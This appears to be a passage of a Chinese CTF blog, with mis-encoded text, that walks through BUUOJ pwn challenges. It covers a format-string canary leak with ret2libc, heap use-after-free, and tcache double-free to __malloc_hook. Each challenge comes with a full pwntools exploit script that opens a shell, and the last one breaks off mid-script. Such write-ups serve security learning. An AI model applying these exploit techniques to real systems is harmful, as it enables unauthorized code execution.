<h3 id="å››åã€bjdctf-2020-babyrop2"><a href="#å››åã€bjdctf-2020-babyrop2" class="headerlink" title="å››åã€bjdctf_2020_babyrop2"></a>å››åã€bjdctf_2020_babyrop2</h3><p>checksecä¸€ä¸‹</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100246.png"></p>
<p>å¼€å¯äº†NXå’ŒCanary</p>
<p>è¿›å…¥idaçœ‹çœ‹ä»£ç </p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100325.png"></p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100334.png"></p>
<p>ä¸€ä¸ªå‡½æ•°é‡Œé¢æœ‰ç€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå…è®¸æˆ‘ä»¬è¾“å…¥å…­ä¸ªé•¿åº¦çš„æ•°æ®ï¼Œç”¨æ¥æ³„éœ²canaryçš„ï¼Œç„¶ååœ¨åé¢çš„å‡½æ•°é‡Œé¢å­˜åœ¨æ ˆæº¢å‡ºï¼Œæ³„éœ²libcçš„ä»¥åŠgetshellçš„ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529092432.png"></p>
<p>AAAAAAæ˜¯æˆ‘è¾“è¿›å»çš„å†…å®¹ï¼Œä»–çš„ä½ç½®åœ¨æ ˆé¡¶å¤„ï¼Œæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å…­ä¸ªå‚æ•°ï¼Œå¯ä»¥çœ‹è§ï¼Œåœ¨å…¶ä¸‹é¢çš„å°±æ˜¯æˆ‘ä»¬è¦çš„canaryäº†ï¼Œæ‰€ä»¥æ˜¯ç¬¬ä¸ƒä¸ªå‚æ•°ï¼Œä»è€Œç¡®å®šæ„é€ ä¸ºâ€%7$pâ€ï¼Œä¹‹åå°±æ˜¯æ­£å¸¸çš„æ™®é€šropå†…å®¹äº†ã€‚</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400993</span><br>main=<span class="hljs-number">0x400887</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;%7$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;u!&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.recv()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu04</title>
    <url>/2021/05/05/2021-05-05-buu04/</url>
    <content><![CDATA[<p>ä»¥ä¸‹å‡ é¢˜çš„ciscnæ˜¯æˆ‘å…ˆæŠ½å‡ºæ¥åšçš„ï¼Œå› ä¸ºè¿™å‡ å‘¨åœ¨è¿›è¡Œisccï¼Œä»¥åŠä¸ä¹…å°±æ˜¯ciscnï¼Œæ‰€ä»¥çœ‹çœ‹ä¹‹å‰çš„é¢˜ç›®ï¼Œå°±å…ˆä¸æŒ‰é¡ºåº</p>
<h3 id="åä¸ƒã€ciscn-2019-n-3"><a href="#åä¸ƒã€ciscn-2019-n-3" class="headerlink" title="åä¸ƒã€ciscn_2019_n_3"></a>åä¸ƒã€ciscn_2019_n_3</h3><p>ç…§ä¾‹checksecä¸€ä¸‹</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110425-1620522753562.png"></p>
<p>å¼€å¯äº†nxå’Œcanaryï¼Œrelroåªå¼€å¯éƒ¨åˆ†ï¼Œå¯ä»¥ä¿®æ”¹gotè¡¨ï¼ˆåé¢æ²¡ç”¨åˆ°å°±æ˜¯äº†ï¼‰</p>
<p>è¿›å…¥idaçœ‹çœ‹åæ±‡ç¼–ä»£ç </p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110633-1620522770994.png"></p>
<p>æ€»å…±æœ‰ç€å››ä¸ªåŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ªnew noteï¼š</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110745.png"></p>
<p>åœ¨ç¬¬ä¸€ä¸ªåŠŸèƒ½é‡Œé¢ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå †ï¼Œå †é‡Œé¢ç¬¬ä¸€ä¸ªå­˜æ”¾çš„æ˜¯printfå‡½æ•°æŒ‡é’ˆï¼Œç¬¬äºŒå­˜æ”¾äº†ä¸€ä¸ªfreeå‡½æ•°æŒ‡é’ˆï¼Œç¬¬ä¸‰ä¸ªå­˜æ”¾æœ‰åŒºåˆ«ï¼Œå½“type==1ï¼Œå­˜æ”¾çš„æ˜¯ä¸€ä¸ªæ•°æ®ï¼Œtype ==2ï¼Œå­˜æ”¾çš„æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ã€‚ç„¶åè¿™ä¸ªå­—ç¬¦ä¸²çš„çœŸæ­£ä½ç½®å­˜æ”¾åœ¨åˆç”Ÿæˆçš„ä¸€ä¸ªå †é‡Œé¢ã€‚</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505111350.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505111403.png"></p>
<p>freeå‡½æ•°é‡Œé¢å¹¶æœªå°†æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨uafæ¼æ´ã€‚</p>
<p>å¦å¤–ä¸‰ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯è°ƒç”¨printfå‡½æ•°æŒ‡é’ˆï¼Œæ‰“å°å‡ºä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªæ˜¯è°ƒç”¨freeå‡½æ•°æŒ‡é’ˆï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯æ‰“å°æ²¡ä»€ä¹ˆæ„ä¹‰çš„å­—ç¬¦ä¸²</p>
<p>åœ¨å‡½æ•°è¡¨é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œsystemå‡½æ•°è¢«è°ƒç”¨è¿‡äº†ï¼Œä¹Ÿå°±æ˜¯æ¥ä¸‹æ¥å°±æ˜¯/bin/shä»¥åŠè°ƒç”¨çš„é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©åœ¨å‡½æ•°æŒ‡é’ˆåšæ‰‹è„šï¼Œå› ä¸ºå‡½æ•°æŒ‡é’ˆæœªç½®ç©ºï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠfreeå‡½æ•°æŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘systemçš„åœ°å€ï¼Œç„¶åå†å¯¹é‡Šæ”¾çš„å†…å®¹ä¿®æ”¹ä¸º/bin/shçš„åœ°å€ï¼Œå°±èƒ½è®©è°ƒç”¨free(ptr)å˜æˆsystem(â€œ/bin/shâ€)ï¼Œè¿™è¾¹ç”±äºè¾“å…¥é•¿åº¦é—®é¢˜ï¼Œå†™çš„æ˜¯/shå­—ç¬¦ä¸²ã€‚</p>
<p>é‚£è¯¥æ€ä¹ˆä¿®æ”¹å‘¢ï¼Ÿåˆ©ç”¨fastbin attackï¼Œé¦–å…ˆåˆ›å»ºä¸¤ä¸ªchunkï¼ˆtype==2çš„ï¼Œchunk0å’Œchunk1ï¼‰åˆ›å»ºçš„chunkéƒ½æ˜¯å›ºå®šå¤§å°ä¸º0xcçš„chunkï¼Œåé¢æˆ‘ä»¬èƒ½æ§åˆ¶å¤§å°çš„chunkéšä¾¿å†™ä¸€ä¸ªå¤§å°å³å¯ï¼ˆä¸èƒ½ä¸º0xcï¼å…¶ä»–éƒ½è¡Œï¼‰ã€‚ç„¶åé‡Šæ”¾æ‰è¿™ä¸¤ä¸ªchunkï¼Œå†ç”³è¯·ä¸€ä¸ªchunk3ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶å¤§å°çš„chunkä¹Ÿè¦è®¾ç½®å¤§å°ä¹Ÿä¸º0xcï¼Œç”±äºLIFOï¼Œé‚£ä¹ˆç¨‹åºåˆ›å»ºçš„chunkå°†ä¼šè¢«åˆ†é…åˆ°ç¬¬äºŒä¸ªè¢«é‡Šæ”¾çš„chunk1çš„ä½ç½®ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶å¤§å°çš„chunkå°±ä¼šè¢«åˆ†é…åˆ°ç¬¬ä¸€ä¸ªé‡Šæ”¾çš„chunk0çš„ä½ç½®ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¯¹è¿™ä¸ªchunkè¿›è¡Œè¾“å…¥ï¼Œæ‰€ä»¥æŠŠâ€sh\x00\x00â€+p32(system)è¾“å…¥å³å¯ï¼Œæœ€åå†é‡Šæ”¾æ‰è°ƒç”¨å‡½æ•°</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505112805.png"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,27753)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx,num,size,value</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Type &gt;&quot;</span>,<span class="hljs-built_in">str</span>(num))<br>	<span class="hljs-keyword">if</span> num==<span class="hljs-number">1</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<span class="hljs-keyword">else</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Length &gt;&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">purchase</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">&quot;sh\x00\x00&quot;</span>+p32(system))<br>gdb.attach(p,<span class="hljs-string">&#x27;b*main&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)   <span class="hljs-comment">#uaf</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="åå…«ã€ciscn-2019-final-3"><a href="#åå…«ã€ciscn-2019-final-3" class="headerlink" title="åå…«ã€ciscn_2019_final_3"></a>åå…«ã€ciscn_2019_final_3</h3><p>å¸¸è§„checksecä¸€ä¸‹</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505113309.png"></p>
<p>ä¿æŠ¤å…¨å¼€äº†ï¼Œæ‹–è¿›idaçœ‹çœ‹åæ±‡ç¼–ä»£ç å§</p>
<img src="/2021/05/05/2021-05-05-buu04/QQå›¾ç‰‡20210505202136.png">

<p>c++ä»£ç å†™çš„ï¼Œä¸è¿‡åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±ä¸¤ä¸ªé€‰æ‹©ï¼Œå…ˆçœ‹ç¬¬ä¸€ä¸ªå§</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505202251.png"></p>
<p>æœ€å¤šå¯ä»¥åˆ›å»ºäºŒåå››ä¸ªä¸åŒçš„ç´¢å¼•ï¼Œå †çš„å¤§å°æœ€å¤§ä¸èƒ½è¶…è¿‡0x78ï¼Œè¢«é™åˆ¶åªæœ‰fast chunkå¤§å°ï¼Œç„¶åæˆ‘ä»¬åœ¨åˆ›å»ºä¹‹åè¿˜èƒ½å¾€å †ä¸Šè¾“å…¥æ•°æ®ï¼Œæœ€åï¼Œprintfäº†å †çš„åœ°å€å‡ºæ¥ã€‚</p>
<p>ç¬¬äºŒä¸ªåŠŸèƒ½æ›´ç®€å•</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505202536.png"></p>
<p>é‡Šæ”¾æ‰ç´¢å¼•å¯¹åº”çš„å †å—ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°ï¼Œå¹¶æœªå°†å †æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨uafæ¼æ´ã€‚åœ¨æ‰¾æ‰¾å…¶ä»–åœ°æ–¹ï¼Œå‘ç°æ²¡æœ‰å­˜åœ¨åé—¨å‡½æ•°ã€‚é‚£åªèƒ½èµ°æ³„éœ²libcäº†ï¼Œç„¶ååŠ«æŒhookå‡½æ•°ã€‚</p>
<p>è¦æ³„éœ²libcï¼Œå°±è¦æœ‰è¢«é‡Šæ”¾çš„unsorted binï¼Œè¿™é‡Œé™åˆ¶äº†chunkçš„å¤§å°ï¼Œé‚£æˆ‘ä»¬å°±è¦å»ä¿®æ”¹chunk sizeï¼Œå°†å…¶ä¿®æ”¹ä¸ºæ¯”0x410å¤§çš„æ•°ï¼Œå› ä¸ºé¢˜ç›®ç¯å¢ƒä¸ºlibc-2.27.soï¼Œå­˜åœ¨tcacheã€‚</p>
<p>å…ˆåˆ›å»ºè®¸å¤šå †å—ï¼ˆåé¢å†è§£é‡Šä¸ºä»€ä¹ˆåˆ›å»ºè¿™ä¹ˆå¤šä¸ªï¼‰ï¼Œç„¶åé‡Šæ”¾åŒä¸€ä¸ªå †å—ï¼Œå› ä¸ºå­˜åœ¨tcacheï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡Šæ”¾ä¸¤æ¬¡</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203105.png"></p>
<p>å‡ºç°äº†å¾ªç¯æŒ‡å‘ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åœ¨ç”³è¯·åŒæ ·å¤§å°çš„å †å—ï¼Œè¿™é‡Œæ˜¯è¦ç”³è¯·ä¸‰æ¬¡ï¼Œç¬¬ä¸‰æ¬¡chunkç”Ÿæˆçš„åœ°æ–¹ï¼ˆé€‰æ‹©ç”Ÿæˆåœ¨chunk0çš„sizeå¤„ï¼Œä¿®æ”¹ä»–çš„å€¼ï¼‰ï¼Œæ‰æ˜¯æˆ‘ä»¬è¦çš„ã€‚é¦–å…ˆæ˜¯æŒ‡å‘è‡ªèº«ï¼Œå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡ç”³è¯·æ—¶ï¼Œé€šè¿‡è¾“å…¥æŠŠfdä¿®æ”¹ä¸ºæŒ‡å‘chunk0</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203355.png"></p>
<p>è¿™æ˜¯ç¬¬ä¸€æ¬¡ç”³è¯·ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œchunk0åœ°å€å‡ºç°äº†</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203604.png"></p>
<p>è¿™æ˜¯ç¬¬äºŒæ¬¡ç”³è¯·ï¼Œåªå‰©ä¸‹chunk0ï¼Œé‚£ç¬¬ä¸‰æ¬¡ç”³è¯·å°±èƒ½è®©chunkå‡ºç°åœ¨chunk0ä½ç½®ï¼Œç„¶åä¿®æ”¹å…¶sizeçš„å¤§å°ï¼Œè¿™è¾¹æˆ‘æ˜¯ä¿®æ”¹ä¸º0x420</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203733.png"></p>
<p>ç„¶åæŠŠè¿™ä¸ªå †å—é‡Šæ”¾æ‰ï¼Œå°±ä¼šå‡ºç°libcäº†ï¼Œè¿™è¾¹è§£é‡Šä¸ºä»€ä¹ˆè¦ç”³è¯·å¾ˆå¤šçš„å †å—ï¼Œå› ä¸ºä½ è¦ä¿®æ”¹ä¸º0x420ï¼Œå¦‚æœç”³è¯·çš„å †å—æ²¡æœ‰å¤§äº0x420ï¼Œé‚£è¿™ä¸ªå †å—ä¼šä¸€ç›´å¤„äºfreeçš„çŠ¶æ€çš„ï¼Œä»–è¦æœ‰é‚£ä¹ˆå¤§çš„sizeï¼Œæ‰èƒ½æˆä¸º0x420çš„chunkï¼Œæ‰€ä»¥æˆ‘ä»¬ç”³è¯·çš„å †å—ä¼šå…ˆè¢«å¹¶å…¥è¿™ä¸ªå¤§chunké‡Œé¢ã€‚</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505204038.png"></p>
<p>é‡Šæ”¾å®Œåå‡ºç°äº†libcä¸­çš„åœ°å€ï¼Œæ¥ä¸‹æ¥å°±æ³„éœ²äº†ã€‚å› ä¸ºé¢˜ç›®é‡Œé¢åªèƒ½æ³„éœ²å‡ºå †å—çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è®©åœ¨è¿™ä¸ªåœ°å€ç”³è¯·chunkã€‚è¿™è¾¹å› ä¸ºè¿™ä¸ª0x420çš„chunkæ˜¯ç”±è®¸å¤šchunkåˆå¹¶çš„ï¼Œæˆ‘ä»¬æŠŠchunk1é‡Šæ”¾äº†ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å°å’Œchunk0ä¸€æ ·çš„å †å—ï¼Œå°±å¯ä»¥è®©chunk1èƒ½å¤Ÿé‡å åœ¨fdçš„ä½ç½®</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505204421.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ0x20å¤§å°çš„tcache_entryå‡ºç°äº†ç±»ä¼¼å‰é¢çš„é‡å¤é‡Šæ”¾çš„æ ·å¼ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ç”³è¯·å †å—ï¼Œç„¶ååœ¨libcåœ°å€ç”Ÿæˆchunkï¼Œå†å°†å…¶æ³„éœ²ã€‚ä¹‹åå°±æ˜¯åŠ«æŒhookäº†ï¼Œä»¥ä¸Šçš„å°±æ˜¯è¿™é¢˜çš„ç‚¹äº†ï¼Œåé¢ä¸å¤šè¯´äº†ã€‚</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25609</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,write</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;something&quot;</span>,write)<br>	p.recvuntil(<span class="hljs-string">&quot;gift :&quot;</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>ptr0=add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ptr0)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#4</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#5 </span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#6</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#7 </span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#9 </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#10</span><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#11</span><br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#12</span><br><br>remove(<span class="hljs-number">12</span>)<br>remove(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>))<br>remove(<span class="hljs-number">0</span>)<br>remove(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>libc_base=add(<span class="hljs-number">18</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)-<span class="hljs-number">0x3ebca0</span><br>__malloc_hook=libc_base+__malloc_hook<br>one_gadget=libc_base+<span class="hljs-number">0x10a38c</span><br>log.info(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>log.info(<span class="hljs-string">&quot;__malloc_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(__malloc_hook))<br>log.info(<span class="hljs-string">&quot;one_gadget: &quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br>remove(<span class="hljs-number">3</span>)<br>remove(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x70</span>,p64(one_gadget))<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b*main&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-string">&#x27;22&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-string">&#x27;0x30&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="åä¹ã€ciscn-2019-s-4"><a href="#åä¹ã€ciscn-2019-s-4" class="headerlink" title="åä¹ã€ciscn_2019_s_4"></a>åä¹ã€ciscn_2019_s_4</h3><p>è¿™é¢˜å¥½åƒä¹‹å‰æœ‰è¿‡ï¼Ÿæ‰€ä»¥è¿™é‡Œå°±ä¸å†å¤šè¯´äº†ï¼Œæ ˆè¿ç§»çš„é¢˜ç›®ï¼Œç›´æ¥è´´expäº†</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29292</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br><br>payload=<span 